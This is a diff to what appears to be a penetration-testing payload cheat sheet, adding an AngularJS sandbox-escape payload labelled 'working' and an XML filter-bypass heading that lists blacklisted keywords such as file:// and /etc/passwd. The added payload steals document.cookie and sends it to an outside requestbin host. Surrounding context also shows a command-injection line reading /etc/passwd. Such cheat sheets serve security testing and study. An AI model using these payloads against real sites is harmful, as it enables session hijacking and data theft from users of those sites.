@@ -299,6 +299,11 @@ original_cmd_by_server $(cat /etc/passwd)
 
 Tool: https://github.com/epinna/tplmap
 
+Working AngularJS payload (EXT BREAK #2):
+```
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=5+5,new Image().src="http://requestbin.fullcontact.com/1b17hka1?asdf="+document.cookie,alert(2)');}}
+```
+
 Angular JS:
 ```
 {{ 7*7 }} => 49
@@ -350,6 +355,13 @@ XXE Out-of-Bounds attack:
 ```
 
 ```
+
+XML Parser/Filter Bypass:
+_Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs included_
+```
+
+```
+
 ---
 ### XSS Normal and Advanced
 ---
